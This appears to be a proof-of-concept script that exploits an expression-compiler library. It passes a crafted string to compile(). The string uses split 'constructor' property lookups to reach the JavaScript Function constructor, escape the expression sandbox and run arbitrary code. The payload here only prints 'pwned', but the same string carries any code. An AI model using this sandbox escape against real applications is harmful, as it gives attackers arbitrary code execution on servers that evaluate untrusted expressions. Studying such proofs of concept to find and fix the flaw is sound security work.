var expressions = require("./src/main.js");
var compile = expressions.compile;

evaluate = compile( "''['c'+'onstructor']['c'+'onstructor']('console.log(\"pwned\");')()" );
const result = evaluate({});
